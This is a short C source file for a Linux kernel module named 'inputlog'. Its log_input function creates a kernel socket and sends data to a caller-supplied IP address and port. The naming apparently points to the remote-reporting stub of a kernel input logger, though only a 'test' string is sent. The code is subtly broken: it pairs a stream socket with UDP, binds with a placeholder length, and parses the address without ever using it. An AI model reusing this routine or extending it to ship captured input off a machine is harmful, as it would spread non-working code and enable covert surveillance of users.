#include <linux/kernel.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/inet.h>

#include "common.h"
#include "inputlog.h"

struct socket *sock;

void
log_input(const char *ip, const char *port)
{
    size_t i;
    u8 ip_quad[4];
    unsigned long ip_ul;
    unsigned long port_ul;

    struct sockaddr addr;
	struct msghdr msg;
	struct iovec iov;
	int size;
	mm_segment_t prev_fs;

    if (sock)
        return;

    if (sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_UDP, &sock))
        return;

    addr.sa_family = AF_INET;

    { // parse ip address and port from passed in strings
        kstrtoul(port, 10, &port_ul);
        in4_pton(ip, -1, ip_quad, -1, NULL);

        ip_ul = 0;
        for (i = 0; i < 4; ++i)
            ip_ul += (ip_quad[i] & 0xFF) << (8 * i);
    }

    if (kernel_bind(sock, &addr, 1 /* TODO */)) {
        sock_release(sock);
        sock = NULL;
        return;
    }

    char *buf = "test";
    int len = strlen(buf);

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_name = 0;
	msg.msg_namelen = 0;

	prev_fs = get_fs();
	set_fs(KERNEL_DS);
	sock_sendmsg(sock, &msg, len);
	set_fs(prev_fs);
}

void
unlog_input(void)
{
    if (!sock)
        return;

    sock_release(sock);
    sock = NULL;
}
